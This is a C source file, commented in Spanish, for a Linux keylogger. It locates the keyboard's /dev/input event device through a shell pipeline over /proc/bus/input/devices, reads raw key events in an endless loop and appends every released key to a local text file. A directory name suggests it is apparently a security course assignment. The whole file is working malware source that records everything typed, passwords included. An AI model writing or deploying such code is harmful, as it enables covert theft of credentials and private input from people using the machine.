#include <stdio.h>          
#include <fcntl.h>          
#include <unistd.h>         
#include <linux/input.h>    
#include <sys/stat.h>       
#include <string.h>         
#include <stdlib.h>         
#include <errno.h>          

#define LOGFILEPATH "/home/kevin/Descargas/TareaSeguridad/keylogger.txt" // Ruta donde se guardan las teclas presionadas

// Mapa completo de teclas según su código escaneado
    char *mapeo[] = {
        "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
        "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "LCTRL",
        "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "LSHIFT", "\\", "z", "x", 
        "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT", "*", "LALT", "SPACE", "CAPSLOCK",
        "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK",
        "KP7", "KP8", "KP9", "KP_MINUS", "KP4", "KP5", "KP6", "KP_PLUS", "KP1", "KP2", "KP3", 
        "KP0", "KP_DOT", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "", "", "", "",
        "KP_ENTER", "RCTRL", "", "", "RALT", "", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", 
        "DOWN", "PGDN", "INS", "DEL", "", "", "", "", "", "", "", "PAUSE", "", "", "", "", "", 
        "", "", "", "", "", "", "", "", "LWIN", "RWIN", "MENU"

    };

// Declaración de la función que obtiene el evento de teclado
char *getEvent();
int main(){
    struct input_event ev;                              // Estructura para manejar eventos de dispositivos de entrada
    static char path_keyboard[20] = "/dev/input/";      // Cadena base para la ruta del dispositivo de teclado
    strcat(path_keyboard, getEvent());                  // Concatena el evento del teclado al camino del dispositivo
    path_keyboard[strlen(path_keyboard)-1] = 0;         // Eliminar el carácter de nueva línea al final

    // Abre el dispositivo de teclado en modo solo lectura
    int archivo_teclado = open(path_keyboard, O_RDONLY);
    if (archivo_teclado < 0) {                           // Si falla al abrir el dispositivo
        perror("Error al abrir el dispositivo de teclado");
        return 1;                                        // Salir con error
    }

    // Abre el archivo de registro en modo de anexado
    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {                                     // Si falla al abrir el archivo
        perror("Error al abrir el archivo de registro");
        return 1;                                         // Salir con error
    }

    // Bucle infinito para capturar teclas
    while (1) {
        read(archivo_teclado, &ev, sizeof(ev));            // Lee un evento del teclado
        // Si el evento es del tipo EV_KEY y la tecla fue liberada (ev.value == 0)
        if (ev.type == EV_KEY && ev.value == 0) {
            // Si el código de la tecla está dentro del rango de mapeo
            if (ev.code < sizeof(mapeo)/sizeof(mapeo[0])) {
                fprintf(fp, "%s", mapeo[ev.code]);         // Escribe la tecla en el archivo de registro
                fflush(fp);                                // Aseguramos que los datos se escriban inmediatamente
            }
        }
    }

    fclose(fp);                                             // Cerramos el archivo (NUestro bucle es infinito)
    close(archivo_teclado);                                 // Cerramos el dispositivo de teclado
    return 0;                                               // Fin del programa
}

// Función para obtener el evento de teclado del sistema
char *getEvent(){
    // Comando para buscar el evento del teclado
    char *command =  (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];                                   // Buffer para almacenar el evento (eventX)
    FILE *pipe = popen(command, "r");                      // Ejecuta el comando en una subshell y abre un pipe para leer su salida
    if (!pipe)                                             // Si falla al abrir el pipe
        exit(1);                                          // Salir con error

    fgets(event, 8, pipe);                                // Lee el identificador del evento (eventX)
    pclose(pipe);                                         // Cerramos el pipe
    return event;                                         // Devuelve el evento de teclado
}
